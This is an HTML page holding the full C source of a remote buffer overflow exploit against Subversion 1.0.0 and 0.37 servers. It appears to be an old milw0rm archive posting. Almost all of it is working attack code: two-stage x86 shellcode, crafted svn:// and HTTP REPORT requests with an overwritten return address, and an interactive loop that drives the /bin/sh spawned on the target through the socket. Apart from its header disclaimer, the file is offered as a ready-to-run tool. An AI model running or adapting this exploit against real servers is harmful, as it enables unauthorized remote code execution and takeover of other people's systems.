<html><head><title>Subversion 0.3.7/1.0.0 Remote Buffer Overflow Exploit</title></head><pre>/*****************************************************************
 * hoagie_subversion.c
 *
 * Remote exploit against Subversion-Servers.
 *
 * Author: greuff &lt;greuff@void.at&gt;
 *
 * Tested on Subversion 1.0.0 and 0.37
 *
 * Algorithm:
 * This is a two-stage exploit. The first stage overflows a buffer
 * on the stack and leaves us ~60 bytes of machine code to be
 * executed. We try to find the socket-fd there and then do a 
 * read(2) on the socket. The exploit then sends the second stage
 * loader to the server, which can be of any length (up to the
 * obvious limits, of course). This second stage loader spawns 
 * /bin/sh on the server and connects it to the socket-fd.
 *
 * Credits:
 *    void.at
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
 * THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
 * CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
 *
 *****************************************************************/

#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;netdb.h&gt;

enum protocol { SVN, SVNSSH, HTTP, HTTPS };

char stage1loader[]=
             // begin socket fd search
             &quot;\x31\xdb&quot;            // xor %ebx, %ebx
             &quot;\x90&quot;                // nop (UTF-8)
             &quot;\x53&quot;                // push %ebx
             &quot;\x58&quot;                // pop %eax
             &quot;\x50&quot;                // push %eax
             &quot;\x5f&quot;                // pop %edi                # %eax = %ebx = %edi = 0
             &quot;\x2c\x40&quot;            // sub $0x40, %al
             &quot;\x50&quot;                // push %eax
             &quot;\x5b&quot;                // pop %ebx
             &quot;\x50&quot;                // push %eax
             &quot;\x5a&quot;                // pop %edx                # %ebx = %edx = 0xC0
             &quot;\x57&quot;                // push %edi
             &quot;\x57&quot;                // push %edi               # safety-0
             &quot;\x54&quot;                // push %esp
             &quot;\x59&quot;                // pop %ecx                # %ecx = pointer to the buffer
             &quot;\x4b&quot;                // dec %ebx                # beginloop:
             &quot;\x57&quot;                // push %edi
             &quot;\x58&quot;                // pop %eax                # clear %eax
             &quot;\xd6&quot;                // salc (UTF-8)
             &quot;\xb0\x60&quot;            // movb $0x60, %al
             &quot;\x2c\x44&quot;            // sub $0x44, %al          # %eax = 0x1C
             &quot;\xcd\x80&quot;            // int $0x80               # fstat(i, &amp;stat)
             &quot;\x58&quot;                // pop %eax
             &quot;\x58&quot;                // pop %eax
             &quot;\x50&quot;                // push %eax
             &quot;\x50&quot;                // push %eax
             &quot;\x38\xd4&quot;            // cmp %dl, %ah            # uppermost 2 bits of st_mode set?
             &quot;\x90&quot;                // nop (UTF-8)
             &quot;\x72\xed&quot;            // jb beginloop
             &quot;\x90&quot;                // nop (UTF-8)
             &quot;\x90&quot;                // nop (UTF-8)             # %ebx now contains the socket fd
             // begin read(2)
             &quot;\x57&quot;                // push %edi
             &quot;\x58&quot;                // pop %eax                # zero %eax
             &quot;\x40&quot;                // inc %eax
             &quot;\x40&quot;                // inc %eax
             &quot;\x40&quot;                // inc %eax                # %eax=3
             //&quot;\x54&quot;                // push %esp
             //&quot;\x59&quot;                // pop %ecx                # %ecx ... address of buffer
             //&quot;\x54&quot;                // push %edi
             //&quot;\x5a&quot;                // pop %edx                # %edx ... bufferlen (0xC0)
             &quot;\xcd\x80&quot;            // int $0x80               # read(2) second stage loader
             &quot;\x39\xc7&quot;            // cmp %eax, %edi
             &quot;\x90&quot;                // nop (UTF-8)
             &quot;\x7f\xf3&quot;            // jg startover
             &quot;\x90&quot;                // nop (UTF-8)
             &quot;\x90&quot;                // nop (UTF-8)
             &quot;\x90&quot;                // nop (UTF-8)
             &quot;\x54&quot;                // push %esp
             &quot;\xc3&quot;                // ret                     # execute second stage loader
             &quot;\x90&quot;                // nop (UTF-8)
             &quot;\0&quot;    // %ebx still contains the fd we can use in the 2nd stage loader.
             ;

char stage2loader[]=
             // dup2 - %ebx contains the fd
             &quot;\xb8\x3f\x00\x00\x00&quot;   // mov $0x3F, %eax
             &quot;\xb9\x00\x00\x00\x00&quot;   // mov $0x0, %ecx
             &quot;\xcd\x80&quot;               // int $0x80
             &quot;\xb8\x3f\x00\x00\x00&quot;   // mov $0x3F, %eax
             &quot;\xb9\x01\x00\x00\x00&quot;   // mov $0x1, %ecx
             &quot;\xcd\x80&quot;               // int $0x80
             &quot;\xb8\x3f\x00\x00\x00&quot;   // mov $0x3F, %eax
             &quot;\xb9\x02\x00\x00\x00&quot;   // mov $0x2, %ecx
             &quot;\xcd\x80&quot;               // int $0x80
             // start /bin/sh
             &quot;\x31\xd2&quot;               // xor %edx, %edx
             &quot;\x52&quot;                   // push %edx
             &quot;\x68\x6e\x2f\x73\x68&quot;   // push $0x68732f6e
             &quot;\x68\x2f\x2f\x62\x69&quot;   // push $0x69622f2f
             &quot;\x89\xe3&quot;               // mov %esp, %ebx
             &quot;\x52&quot;                   // push %edx
             &quot;\x53&quot;                   // push %ebx
             &quot;\x89\xe1&quot;               // mov %esp, %ecx
             &quot;\xb8\x0b\x00\x00\x00&quot;   // mov $0xb, %eax
             &quot;\xcd\x80&quot;               // int $0x80
             &quot;\xb8\x01\x00\x00\x00&quot;   // mov $0x1, %eax
             &quot;\xcd\x80&quot;               // int %0x80     (exit)
             ;

int stage2loaderlen=69;
             
char requestfmt[]=
&quot;REPORT %s HTTP/1.1\n&quot;
&quot;Host: %s\n&quot;
&quot;User-Agent: SVN/0.37.0 (r8509) neon/0.24.4\n&quot;
&quot;Content-Length: %d\n&quot;
&quot;Content-Type: text/xml\n&quot;
&quot;Connection: close\n\n&quot;
&quot;%s\n&quot;;

char xmlreqfmt[]=
&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&quot;
&quot;&lt;S:dated-rev-report xmlns:S=\&quot;svn:\&quot; xmlns:D=\&quot;DAV:\&quot;&gt;&quot;
&quot;&lt;D:creationdate&gt;%s%c%c%c%c&lt;/D:creationdate&gt;&quot;
&quot;&lt;/S:dated-rev-report&gt;&quot;;

int parse_uri(char *uri,enum protocol *proto,char host[1000],int *port,char repos[1000])
{
   char *ptr;
   char bfr[1000];
   
   ptr=strstr(uri,&quot;://&quot;);
   if(!ptr) return -1;
   *ptr=0;
   snprintf(bfr,sizeof(bfr),&quot;%s&quot;,uri);
   if(!strcmp(bfr,&quot;http&quot;))
      *proto=HTTP, *port=80;
   else if(!strcmp(bfr,&quot;svn&quot;))
      *proto=SVN, *port=3690;
   else
   {
      printf(&quot;Unsupported protocol %s\n&quot;,bfr);
      return -1;
   }
   uri=ptr+3;
   if((ptr=strchr(uri,':')))
   {
      *ptr=0;
      snprintf(host,1000,&quot;%s&quot;,uri);
      uri=ptr+1;
      if((ptr=strchr(uri,'/'))==NULL) return -1;
      *ptr=0;
      snprintf(bfr,1000,&quot;%s&quot;,uri);
      *port=(int)strtol(bfr,NULL,10);
      *ptr='/';
      uri=ptr;
   }
   else if((ptr=strchr(uri,'/')))
   {
      *ptr=0;
      snprintf(host,1000,&quot;%s&quot;,uri);
      *ptr='/';
      uri=ptr;
   }
   snprintf(repos,1000,&quot;%s&quot;,uri);
   return 0;
}

int exec_sh(int sockfd)
{
   char snd[4096],rcv[4096];
   fd_set rset;
   while(1)
   {
      FD_ZERO(&amp;rset);
      FD_SET(fileno(stdin),&amp;rset);
      FD_SET(sockfd,&amp;rset);
      select(255,&amp;rset,NULL,NULL,NULL);
      if(FD_ISSET(fileno(stdin),&amp;rset))
      {
         memset(snd,0,sizeof(snd));
         fgets(snd,sizeof(snd),stdin);
         write(sockfd,snd,strlen(snd));
      }
      if(FD_ISSET(sockfd,&amp;rset))
      {
         memset(rcv,0,sizeof(rcv));
         if(read(sockfd,rcv,sizeof(rcv))&lt;=0)
            exit(0);
         fputs(rcv,stdout);
      }
   }
}

int main(int argc, char **argv)
{
   int sock, port;
   size_t size;
   char cmd[1000], reply[1000], buffer[1000];
   char svdcmdline[1000];
   char host[1000], repos[1000], *ptr, *caddr;
   unsigned long addr;
   struct sockaddr_in sin;
   struct hostent *he;
   enum protocol proto;

   /*sock=open(&quot;output&quot;,O_CREAT|O_TRUNC|O_RDWR,0666);
   write(sock,stage1loader,strlen(stage1loader));
   close(sock);
   return 0;*/

   printf(&quot;hoagie_subversion - remote exploit against subversion servers\n&quot;
          &quot;by greuff@void.at\n\n&quot;);
   if(argc!=3)
   {
      printf(&quot;Usage: %s serverurl offset\n\n&quot;,argv[0]);
      printf(&quot;Examples:\n&quot;
             &quot;   %s svn://localhost/repository 0x41414141\n&quot;
             &quot;   %s http://victim.com:6666/svn 0x40414336\n\n&quot;,argv[0],argv[0]);
      printf(&quot;The offset is an alphanumeric address (or UTF-8 to be\n&quot;
             &quot;more precise) of a pop instruction, followed by a ret.\n&quot;
             &quot;Brute force when in doubt.\n\n&quot;);
      printf(&quot;When exploiting against an svn://-url, you can supply a\n&quot;
             &quot;binary offset too.\n\n&quot;);
      exit(1);
   }

   // parse the URI
   snprintf(svdcmdline,sizeof(svdcmdline),&quot;%s&quot;,argv[1]);
   if(parse_uri(argv[1],&amp;proto,host,&amp;port,repos)&lt;0)
   {
      printf(&quot;URI parse error\n&quot;);
      exit(1);
   }
   printf(&quot;parse_uri result:\n&quot;
          &quot;Protocol: %d\n&quot;
          &quot;Host: %s\n&quot;
          &quot;Port: %d\n&quot;
          &quot;Repository: %s\n\n&quot;,proto,host,port,repos);
   addr=strtoul(argv[2],NULL,16);
   caddr=(char *)&amp;addr;
   printf(&quot;Using offset 0x%02x%02x%02x%02x\n&quot;,caddr[3],caddr[2],caddr[1],caddr[0]);

   sock=socket(AF_INET,SOCK_STREAM,0);
   if(sock&lt;0)
   {
      perror(&quot;socket&quot;);
      return -1;
   }

   he=gethostbyname(host);
   if(he==NULL)
   {
      herror(&quot;gethostbyname&quot;);
      return -1;
   }
   sin.sin_family=AF_INET;
   sin.sin_port=htons(port);
   memcpy(&amp;sin.sin_addr.s_addr,he-&gt;h_addr,sizeof(he-&gt;h_addr));
   if(connect(sock,(struct sockaddr *)&amp;sin,sizeof(sin))&lt;0)
   {
      perror(&quot;connect&quot;);
      return -1;
   }

   if(proto==SVN)
   {
      size=read(sock,reply,sizeof(reply));
      reply[size]=0;
      printf(&quot;Server said: %s\n&quot;,reply);
      snprintf(cmd,sizeof(cmd),&quot;( 2 ( edit-pipeline ) %d:%s ) &quot;,strlen(svdcmdline),svdcmdline);
      write(sock,cmd,strlen(cmd));
      size=read(sock,reply,sizeof(reply));
      reply[size]=0;
      printf(&quot;Server said: %s\n&quot;,reply);
      strcpy(cmd,&quot;( ANONYMOUS ( 0: ) ) &quot;);
      write(sock,cmd,strlen(cmd));
      size=read(sock,reply,sizeof(reply));
      reply[size]=0;
      printf(&quot;Server said: %s\n&quot;,reply);
      snprintf(cmd,sizeof(cmd),&quot;( get-dated-rev ( %d:%s%c%c%c%c ) ) &quot;,strlen(stage1loader)+4,stage1loader,
            caddr[0],caddr[1],caddr[2],caddr[3]);
      write(sock,cmd,strlen(cmd));
      size=read(sock,reply,sizeof(reply));
      reply[size]=0;
      printf(&quot;Server said: %s\n&quot;,reply); 
   }
   else if(proto==HTTP)
   {
      // preparing the request...
      snprintf(buffer,sizeof(buffer),xmlreqfmt,stage1loader,
            caddr[0],caddr[1],caddr[2],caddr[3]);
      size=strlen(buffer);
      snprintf(cmd,sizeof(cmd),requestfmt,repos,host,size,buffer);

      // now sending the request, immediately followed by the 2nd stage loader
      printf(&quot;Sending:\n%s&quot;,cmd);
      write(sock,cmd,strlen(cmd));
      sleep(1);
      write(sock,stage2loader,stage2loaderlen);
   }

   // SHELL LOOP
   printf(&quot;Entering shell loop...\n&quot;);
   exec_sh(sock);

   /*sleep(1);
   close(sock);
   printf(&quot;\nConnecting to the shell...\n&quot;);
   exec_sh(connect_sh()); */
   return 0;
}

// milw0rm.com [2005-05-03]</pre></html>